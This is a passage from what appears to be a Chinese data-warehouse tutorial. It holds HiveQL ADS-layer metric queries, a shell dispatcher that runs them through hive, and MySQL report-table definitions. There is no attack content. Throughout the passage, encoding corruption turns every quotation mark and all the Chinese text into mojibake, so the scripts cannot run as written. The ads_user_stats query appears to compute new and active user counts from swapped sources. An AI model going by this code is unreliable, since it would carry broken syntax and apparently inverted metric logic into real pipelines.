dt,</p><p>recent_days,</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>sum(order_count),</p><p>sum(order_total_amount)</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count,</p><p>case recent_days</p><p>when 7 then order_total_amount_7d</p><p>when 30 then order_total_amount_30d</p><p>end order_total_amount</p><p>from ${APP}.dws_trade_province_order_nd lateral view explode(array(7,30)) tmp<br>as recent_days</p><p>where dt=â€™$do_dateâ€™</p><p>)t1</p><p>group by recent_days,province_id,province_name,area_code,iso_code,iso_3166_2;</p><p>â€œ</p><p>ads_page_path=â€</p><p>insert overwrite table ${APP}.ads_page_path</p><p>select * from ${APP}.ads_page_path</p><p>union</p><p>select</p><p>â€˜$do_dateâ€™ dt,</p><p>recent_days,</p><p>source,</p><p>nvl(target,â€™nullâ€™),</p><p>count(*) path_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>concat(â€˜step-â€˜,rn,â€™:â€™,page_id) source,</p><p>concat(â€˜step-â€˜,rn+1,â€™:â€™,next_page_id) target</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>page_id,</p><p>lead(page_id,1,null) over(partition by session_id,recent_days) next_page_id,</p><p>row_number() over (partition by session_id,recent_days order by view_time) rn</p><p>from ${APP}.dwd_traffic_page_view_inc lateral view explode(array(1,7,30)) tmp<br>as recent_days</p><p>where dt&gt;=date_add(â€˜$do_dateâ€™,-recent_days+1)</p><p>)t1</p><p>)t2</p><p>group by recent_days,source,target;</p><p>â€œ</p><p>ads_repeat_purchase_by_tm=â€</p><p>insert overwrite table ${APP}.ads_repeat_purchase_by_tm</p><p>select * from ${APP}.ads_repeat_purchase_by_tm</p><p>union</p><p>select</p><p>â€˜$do_dateâ€™ dt,</p><p>recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>cast(sum(if(order_count&gt;=2,1,0))/sum(if(order_count&gt;=1,1,0)) as decimal(16,2))</p><p>from</p><p>(</p><p>select</p><p>â€˜$do_dateâ€™ dt,</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_count) order_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from ${APP}.dws_trade_user_sku_order_nd lateral view explode(array(7,30)) tmp<br>as recent_days</p><p>where dt=â€™$do_dateâ€™</p><p>)t1</p><p>group by recent_days,user_id,tm_id,tm_name</p><p>)t2</p><p>group by recent_days,tm_id,tm_name;</p><p>â€œ</p><p>ads_sku_cart_num_top3_by_cate=â€</p><p>insert overwrite table ${APP}.ads_sku_cart_num_top3_by_cate</p><p>select * from ${APP}.ads_sku_cart_num_top3_by_cate</p><p>union</p><p>select</p><p>â€˜$do_dateâ€™ dt,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sku_id,</p><p>sku_name,</p><p>cart_num,</p><p>rk</p><p>from</p><p>(</p><p>select</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>cart_num,</p><p>rank() over (partition by category1_id,category2_id,category3_id order by<br>cart_num desc) rk</p><p>from</p><p>(</p><p>select</p><p>sku_id,</p><p>sum(sku_num) cart_num</p><p>from ${APP}.dwd_trade_cart_full</p><p>where dt=â€™$do_dateâ€™</p><p>group by sku_id</p><p>)cart</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name</p><p>from ${APP}.dim_sku_full</p><p>where dt=â€™$do_dateâ€™</p><p>)sku</p><p>on cart.sku_id=sku.id</p><p>)t1</p><p>where rk&lt;=3;</p><p>â€œ</p><p>ads_trade_stats=â€</p><p>insert overwrite table ${APP}.ads_trade_stats</p><p>select * from ${APP}.ads_trade_stats</p><p>union</p><p>select</p><p>â€˜$do_dateâ€™,</p><p>odr.recent_days,</p><p>order_total_amount,</p><p>order_count,</p><p>order_user_count,</p><p>order_refund_count,</p><p>order_refund_user_count</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>sum(order_total_amount_1d) order_total_amount,</p><p>sum(order_count_1d) order_count,</p><p>count(*) order_user_count</p><p>from ${APP}.dws_trade_user_order_1d</p><p>where dt=â€™$do_dateâ€™</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(order_total_amount),</p><p>sum(order_count),</p><p>sum(if(order_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then order_total_amount_7d</p><p>when 30 then order_total_amount_30d</p><p>end order_total_amount,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from ${APP}.dws_trade_user_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=â€™$do_dateâ€™</p><p>)t1</p><p>group by recent_days</p><p>)odr</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>sum(order_refund_count_1d) order_refund_count,</p><p>count(*) order_refund_user_count</p><p>from ${APP}.dws_trade_user_order_refund_1d</p><p>where dt=â€™$do_dateâ€™</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(order_refund_count),</p><p>sum(if(order_refund_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then order_refund_count_7d</p><p>when 30 then order_refund_count_30d</p><p>end order_refund_count</p><p>from ${APP}.dws_trade_user_order_refund_nd lateral view explode(array(7,30))<br>tmp as recent_days</p><p>where dt=â€™$do_dateâ€™</p><p>)t1</p><p>group by recent_days</p><p>)refund</p><p>on odr.recent_days=refund.recent_days;</p><p>â€œ</p><p>ads_trade_stats_by_cate=â€</p><p>insert overwrite table ${APP}.ads_trade_stats_by_cate</p><p>select * from ${APP}.ads_trade_stats_by_cate</p><p>union</p><p>select</p><p>â€˜$do_dateâ€™ dt,</p><p>nvl(odr.recent_days,refund.recent_days),</p><p>nvl(odr.category1_id,refund.category1_id),</p><p>nvl(odr.category1_name,refund.category1_name),</p><p>nvl(odr.category2_id,refund.category2_id),</p><p>nvl(odr.category2_name,refund.category2_name),</p><p>nvl(odr.category3_id,refund.category3_id),</p><p>nvl(odr.category3_name,refund.category3_name),</p><p>nvl(order_count,0),</p><p>nvl(order_user_count,0),</p><p>nvl(order_refund_count,0),</p><p>nvl(order_refund_user_count,0)</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_count_1d) order_count,</p><p>count(distinct(user_id)) order_user_count</p><p>from ${APP}.dws_trade_user_sku_order_1d</p><p>where dt=â€™$do_dateâ€™</p><p>group by<br>category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_count),</p><p>count(distinct(if(order_count&gt;0,user_id,null)))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from ${APP}.dws_trade_user_sku_order_nd lateral view explode(array(7,30)) tmp<br>as recent_days</p><p>where dt=â€™$do_dateâ€™</p><p>)t1</p><p>group by<br>recent_days,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>)odr</p><p>full outer join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_refund_count_1d) order_refund_count,</p><p>count(distinct(user_id)) order_refund_user_count</p><p>from ${APP}.dws_trade_user_sku_order_refund_1d</p><p>where dt=â€™$do_dateâ€™</p><p>group by<br>category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_refund_count),</p><p>count(distinct(if(order_refund_count&gt;0,user_id,null)))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>case recent_days</p><p>when 7 then order_refund_count_7d</p><p>when 30 then order_refund_count_30d</p><p>end order_refund_count</p><p>from ${APP}.dws_trade_user_sku_order_refund_nd lateral view<br>explode(array(7,30)) tmp as recent_days</p><p>where dt=â€™$do_dateâ€™</p><p>)t1</p><p>group by<br>recent_days,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>)refund</p><p>on odr.recent_days=refund.recent_days</p><p>and odr.category1_id=refund.category1_id</p><p>and odr.category1_name=refund.category1_name</p><p>and odr.category2_id=refund.category2_id</p><p>and odr.category2_name=refund.category2_name</p><p>and odr.category3_id=refund.category3_id</p><p>and odr.category3_name=refund.category3_name;</p><p>â€œ</p><p>ads_trade_stats_by_tm=â€</p><p>insert overwrite table ${APP}.ads_trade_stats_by_tm</p><p>select * from ${APP}.ads_trade_stats_by_tm</p><p>union</p><p>select</p><p>â€˜$do_dateâ€™ dt,</p><p>nvl(odr.recent_days,refund.recent_days),</p><p>nvl(odr.tm_id,refund.tm_id),</p><p>nvl(odr.tm_name,refund.tm_name),</p><p>nvl(order_count,0),</p><p>nvl(order_user_count,0),</p><p>nvl(order_refund_count,0),</p><p>nvl(order_refund_user_count,0)</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_count_1d) order_count,</p><p>count(distinct(user_id)) order_user_count</p><p>from ${APP}.dws_trade_user_sku_order_1d</p><p>where dt=â€™$do_dateâ€™</p><p>group by tm_id,tm_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_count),</p><p>count(distinct(if(order_count&gt;0,user_id,null)))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from ${APP}.dws_trade_user_sku_order_nd lateral view explode(array(7,30)) tmp<br>as recent_days</p><p>where dt=â€™$do_dateâ€™</p><p>)t1</p><p>group by recent_days,tm_id,tm_name</p><p>)odr</p><p>full outer join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_refund_count_1d) order_refund_count,</p><p>count(distinct(user_id)) order_refund_user_count</p><p>from ${APP}.dws_trade_user_sku_order_refund_1d</p><p>where dt=â€™$do_dateâ€™</p><p>group by tm_id,tm_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_refund_count),</p><p>count(if(order_refund_count&gt;0,user_id,null))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>case recent_days</p><p>when 7 then order_refund_count_7d</p><p>when 30 then order_refund_count_30d</p><p>end order_refund_count</p><p>from ${APP}.dws_trade_user_sku_order_refund_nd lateral view<br>explode(array(7,30)) tmp as recent_days</p><p>where dt=â€™$do_dateâ€™</p><p>)t1</p><p>group by recent_days,tm_id,tm_name</p><p>)refund</p><p>on odr.recent_days=refund.recent_days</p><p>and odr.tm_id=refund.tm_id</p><p>and odr.tm_name=refund.tm_name;</p><p>â€œ</p><p>ads_traffic_stats_by_channel=â€</p><p>insert overwrite table ${APP}.ads_traffic_stats_by_channel</p><p>select * from ${APP}.ads_traffic_stats_by_channel</p><p>union</p><p>select</p><p>â€˜$do_dateâ€™ dt,</p><p>recent_days,</p><p>channel,</p><p>cast(count(distinct(mid_id)) as bigint) uv_count,</p><p>cast(avg(during_time_1d)/1000 as bigint) avg_duration_sec,</p><p>cast(avg(page_count_1d) as bigint) avg_page_count,</p><p>cast(count(*) as bigint) sv_count,</p><p>cast(sum(if(page_count_1d=1,1,0))/count(*) as decimal(16,2)) bounce_rate</p><p>from ${APP}.dws_traffic_session_page_view_1d lateral view<br>explode(array(1,7,30)) tmp as recent_days</p><p>where dt&gt;=date_add(â€˜$do_dateâ€™,-recent_days+1)</p><p>group by recent_days,channel;</p><p>â€œ</p><p>ads_user_action=â€</p><p>insert overwrite table ${APP}.ads_user_action</p><p>select * from ${APP}.ads_user_action</p><p>union</p><p>select</p><p>â€˜$do_dateâ€™ dt,</p><p>page.recent_days,</p><p>home_count,</p><p>good_detail_count,</p><p>cart_count,</p><p>order_count,</p><p>payment_count</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>sum(if(page_id=â€™homeâ€™,1,0)) home_count,</p><p>sum(if(page_id=â€™good_detailâ€™,1,0)) good_detail_count</p><p>from ${APP}.dws_traffic_page_visitor_page_view_1d</p><p>where dt=â€™$do_dateâ€™</p><p>and page_id in (â€˜homeâ€™,â€™good_detailâ€™)</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(page_id=â€™homeâ€™ and view_count&gt;0,1,0)),</p><p>sum(if(page_id=â€™good_detailâ€™ and view_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>page_id,</p><p>case recent_days</p><p>when 7 then view_count_7d</p><p>when 30 then view_count_30d</p><p>end view_count</p><p>from ${APP}.dws_traffic_page_visitor_page_view_nd lateral view<br>explode(array(7,30)) tmp as recent_days</p><p>where dt=â€™$do_dateâ€™</p><p>and page_id in (â€˜homeâ€™,â€™good_detailâ€™)</p><p>)t1</p><p>group by recent_days</p><p>)page</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>count(*) cart_count</p><p>from ${APP}.dws_trade_user_cart_add_1d</p><p>where dt=â€™$do_dateâ€™</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(cart_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then cart_add_count_7d</p><p>when 30 then cart_add_count_30d</p><p>end cart_count</p><p>from ${APP}.dws_trade_user_cart_add_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=â€™$do_dateâ€™</p><p>)t1</p><p>group by recent_days</p><p>)cart</p><p>on page.recent_days=cart.recent_days</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>count(*) order_count</p><p>from ${APP}.dws_trade_user_order_1d</p><p>where dt=â€™$do_dateâ€™</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(order_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from ${APP}.dws_trade_user_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=â€™$do_dateâ€™</p><p>)t1</p><p>group by recent_days</p><p>)ord</p><p>on page.recent_days=ord.recent_days</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>count(*) payment_count</p><p>from ${APP}.dws_trade_user_payment_1d</p><p>where dt=â€™$do_dateâ€™</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(order_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then payment_count_7d</p><p>when 30 then payment_count_30d</p><p>end order_count</p><p>from ${APP}.dws_trade_user_payment_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=â€™$do_dateâ€™</p><p>)t1</p><p>group by recent_days</p><p>)pay</p><p>on page.recent_days=pay.recent_days;</p><p>â€œ</p><p>ads_user_change=â€</p><p>insert overwrite table ${APP}.ads_user_change</p><p>select * from ${APP}.ads_user_change</p><p>union</p><p>select</p><p>churn.dt,</p><p>user_churn_count,</p><p>user_back_count</p><p>from</p><p>(</p><p>select</p><p>â€˜$do_dateâ€™ dt,</p><p>count(*) user_churn_count</p><p>from ${APP}.dws_user_user_login_td</p><p>where dt=â€™$do_dateâ€™</p><p>and login_date_last=date_add(â€˜$do_dateâ€™,-7)</p><p>)churn</p><p>join</p><p>(</p><p>select</p><p>â€˜$do_dateâ€™ dt,</p><p>count(*) user_back_count</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last</p><p>from ${APP}.dws_user_user_login_td</p><p>where dt=â€™$do_dateâ€™</p><p>)t1</p><p>join</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last login_date_previous</p><p>from ${APP}.dws_user_user_login_td</p><p>where dt=date_add(â€˜$do_dateâ€™,-1)</p><p>)t2</p><p>on t1.user_id=t2.user_id</p><p>where datediff(login_date_last,login_date_previous)&gt;=8</p><p>)back</p><p>on churn.dt=back.dt;</p><p>â€œ</p><p>ads_user_retention=â€</p><p>insert overwrite table ${APP}.ads_user_retention</p><p>select * from ${APP}.ads_user_retention</p><p>union</p><p>select</p><p>â€˜$do_dateâ€™ dt,</p><p>login_date_first create_date,</p><p>datediff(â€˜$do_dateâ€™,login_date_first) retention_day,</p><p>sum(if(login_date_last=â€™$do_dateâ€™,1,0)) retention_count,</p><p>count(*) new_user_count,</p><p>cast(sum(if(login_date_last=â€™$do_dateâ€™,1,0))/count(*)*100 as decimal(16,2))<br>retention_rate</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>date_id login_date_first</p><p>from ${APP}.dwd_user_register_inc</p><p>where dt&gt;=date_add(â€˜$do_dateâ€™,-7)</p><p>and dt&lt;â€˜$do_dateâ€™</p><p>)t1</p><p>join</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last</p><p>from ${APP}.dws_user_user_login_td</p><p>where dt=â€™$do_dateâ€™</p><p>)t2</p><p>on t1.user_id=t2.user_id</p><p>group by login_date_first;</p><p>â€œ</p><p>ads_user_stats=â€</p><p>insert overwrite table ${APP}.ads_user_stats</p><p>select * from ${APP}.ads_user_stats</p><p>union</p><p>select</p><p>â€˜$do_dateâ€™ dt,</p><p>t1.recent_days,</p><p>new_user_count,</p><p>active_user_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(login_date_last&gt;=date_add(â€˜$do_dateâ€™,-recent_days+1),1,0))<br>new_user_count</p><p>from ${APP}.dws_user_user_login_td lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>where dt=â€™$do_dateâ€™</p><p>group by recent_days</p><p>)t1</p><p>join</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(date_id&gt;=date_add(â€˜$do_dateâ€™,-recent_days+1),1,0)) active_user_count</p><p>from ${APP}.dwd_user_register_inc lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>group by recent_days</p><p>)t2</p><p>on t1.recent_days=t2.recent_days;</p><p>â€œ</p><p>case $1 in</p><p>â€œads_activity_statsâ€ )</p><p>hive -e â€œ$ads_activity_statsâ€</p><p>;;</p><p>â€œads_coupon_statsâ€ )</p><p>hive -e â€œ$ads_coupon_statsâ€</p><p>;;</p><p>â€œads_new_buyer_statsâ€ )</p><p>hive -e â€œ$ads_new_buyer_statsâ€</p><p>;;</p><p>â€œads_order_by_provinceâ€ )</p><p>hive -e â€œ$ads_order_by_provinceâ€</p><p>;;</p><p>â€œads_page_pathâ€ )</p><p>hive -e â€œ$ads_page_pathâ€</p><p>;;</p><p>â€œads_repeat_purchase_by_tmâ€ )</p><p>hive -e â€œ$ads_repeat_purchase_by_tmâ€</p><p>;;</p><p>â€œads_sku_cart_num_top3_by_cateâ€ )</p><p>hive -e â€œ$ads_sku_cart_num_top3_by_cateâ€</p><p>;;</p><p>â€œads_trade_statsâ€ )</p><p>hive -e â€œ$ads_trade_statsâ€</p><p>;;</p><p>â€œads_trade_stats_by_cateâ€ )</p><p>hive -e â€œ$ads_trade_stats_by_cateâ€</p><p>;;</p><p>â€œads_trade_stats_by_tmâ€ )</p><p>hive -e â€œ$ads_trade_stats_by_tmâ€</p><p>;;</p><p>â€œads_traffic_stats_by_channelâ€ )</p><p>hive -e â€œ$ads_traffic_stats_by_channelâ€</p><p>;;</p><p>â€œads_user_actionâ€ )</p><p>hive -e â€œ$ads_user_actionâ€</p><p>;;</p><p>â€œads_user_changeâ€ )</p><p>hive -e â€œ$ads_user_changeâ€</p><p>;;</p><p>â€œads_user_retentionâ€ )</p><p>hive -e â€œ$ads_user_retentionâ€</p><p>;;</p><p>â€œads_user_statsâ€ )</p><p>hive -e â€œ$ads_user_statsâ€</p><p>;;</p><p>â€œallâ€ )</p><p>hive -e<br>â€œ$ads_activity_stats$ads_coupon_stats$ads_new_buyer_stats$ads_order_by_province$ads_page_path$ads_repeat_purchase_by_tm$ads_sku_cart_num_top3_by_cate$ads_trade_stats$ads_trade_stats_by_cate$ads_trade_stats_by_tm$ads_traffic_stats_by_channel$ads_user_action$ads_user_change$ads_user_retention$ads_user_statsâ€</p><p>;;</p><p>esac</p><p>ï¼ˆ3ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod +x dws_to_ads.sh</p><p>ï¼ˆ4ï¼‰è„šæœ¬ç”¨æ³•</p><p>[atguigu@hadoop102 bin]$ dws_to_ads.sh all 2020-06-14</p><h2 id="ç¬¬12ç« -æŠ¥è¡¨æ•°æ®å¯¼å‡º"><a href="#ç¬¬12ç« -æŠ¥è¡¨æ•°æ®å¯¼å‡º" class="headerlink" title="ç¬¬12ç«  æŠ¥è¡¨æ•°æ®å¯¼å‡º"></a>ç¬¬12ç«  æŠ¥è¡¨æ•°æ®å¯¼å‡º</h2><p>ä¸ºæ–¹ä¾¿æŠ¥è¡¨åº”ç”¨ä½¿ç”¨æ•°æ®ï¼Œéœ€å°†adså„æŒ‡æ ‡çš„ç»Ÿè®¡ç»“æœå¯¼å‡ºåˆ°MySQLæ•°æ®åº“ä¸­ã€‚</p><h3 id="MySQLå»ºåº“å»ºè¡¨"><a href="#MySQLå»ºåº“å»ºè¡¨" class="headerlink" title="MySQLå»ºåº“å»ºè¡¨"></a>MySQLå»ºåº“å»ºè¡¨</h3><h4 id="åˆ›å»ºæ•°æ®åº“"><a href="#åˆ›å»ºæ•°æ®åº“" class="headerlink" title="åˆ›å»ºæ•°æ®åº“"></a>åˆ›å»ºæ•°æ®åº“</h4><p>CREATE DATABASE IF NOT EXISTS gmall_report DEFAULT CHARSET utf8 COLLATE<br>utf8_general_ci;</p><h4 id="åˆ›å»ºè¡¨"><a href="#åˆ›å»ºè¡¨" class="headerlink" title="åˆ›å»ºè¡¨"></a>åˆ›å»ºè¡¨</h4><p><strong>1ï¼‰å„æ´»åŠ¨è¡¥è´´ç‡</strong></p><p>DROP TABLE IF EXISTS `ads_activity_stats`;</p><p>CREATE TABLE `ads_activity_stats` (</p><p>`dt` date NOT NULL COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`activity_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT â€˜æ´»åŠ¨IDâ€™,</p><p>`activity_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜æ´»åŠ¨åç§°â€™,</p><p>`start_date` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜æ´»åŠ¨å¼€å§‹æ—¥æœŸâ€™,</p><p>`reduce_rate` decimal(16, 2) NULL DEFAULT NULL COMMENT â€˜è¡¥è´´ç‡â€™,</p><p>PRIMARY KEY (`dt`, `activity_id`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>â€˜æ´»åŠ¨ç»Ÿè®¡â€™ ROW_FORMAT = Dynamic;</p><p><strong>2ï¼‰å„ä¼˜æƒ åˆ¸è¡¥è´´ç‡</strong></p><p>DROP TABLE IF EXISTS `ads_coupon_stats`;</p><p>CREATE TABLE `ads_coupon_stats` (</p><p>`dt` date NOT NULL COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`coupon_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT â€˜ä¼˜æƒ åˆ¸IDâ€™,</p><p>`coupon_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜ä¼˜æƒ åˆ¸åç§°â€™,</p><p>`start_date` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜å‘å¸ƒæ—¥æœŸâ€™,</p><p>`rule_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜ä¼˜æƒ è§„åˆ™ï¼Œä¾‹å¦‚æ»¡100å…ƒå‡10å…ƒâ€™,</p><p>`reduce_rate` decimal(16, 2) NULL DEFAULT NULL COMMENT â€˜è¡¥è´´ç‡â€™,</p><p>PRIMARY KEY (`dt`, `coupon_id`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>â€˜ä¼˜æƒ åˆ¸ç»Ÿè®¡â€™ ROW_FORMAT = Dynamic;</p><p><strong>3ï¼‰æ–°å¢äº¤æ˜“ç”¨æˆ·ç»Ÿè®¡</strong></p><p>DROP TABLE IF EXISTS `ads_new_buyer_stats`;</p><p>CREATE TABLE `ads_new_buyer_stats` (</p><p>`dt` date NOT NULL COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1å¤©,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`new_order_user_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜æ–°å¢ä¸‹å•äººæ•°â€™,</p><p>`new_payment_user_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜æ–°å¢æ”¯ä»˜äººæ•°â€™,</p><p>PRIMARY KEY (`dt`, `recent_days`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>â€˜æ–°å¢äº¤æ˜“ç”¨æˆ·ç»Ÿè®¡â€™ ROW_FORMAT = Dynamic;</p><p><strong>4ï¼‰å„çœä»½è®¢å•ç»Ÿè®¡</strong></p><p>DROP TABLE IF EXISTS `ads_order_by_province`;</p><p>CREATE TABLE `ads_order_by_province` (</p><p>`dt` date NOT NULL COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1å¤©,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`province_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT â€˜çœä»½IDâ€™,</p><p>`province_name` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜çœä»½åç§°â€™,</p><p>`area_code` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜åœ°åŒºç¼–ç â€™,</p><p>`iso_code` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT<br>NULL COMMENT â€˜å›½é™…æ ‡å‡†åœ°åŒºç¼–ç â€™,</p><p>`iso_code_3166_2` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜å›½é™…æ ‡å‡†åœ°åŒºç¼–ç â€™,</p><p>`order_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜è®¢å•æ•°â€™,</p><p>`order_total_amount` decimal(16, 2) NULL DEFAULT NULL COMMENT â€˜è®¢å•é‡‘é¢â€™,</p><p>PRIMARY KEY (`dt`, `recent_days`, `province_id`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>â€˜å„åœ°åŒºè®¢å•ç»Ÿè®¡â€™ ROW_FORMAT = Dynamic;</p><p><strong>5ï¼‰ç”¨æˆ·è·¯å¾„åˆ†æ</strong></p><p>DROP TABLE IF EXISTS `ads_page_path`;</p><p>CREATE TABLE `ads_page_path` (</p><p>`dt` date NOT NULL COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1å¤©,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`source` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT â€˜è·³è½¬èµ·å§‹é¡µé¢IDâ€™,</p><p>`target` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT 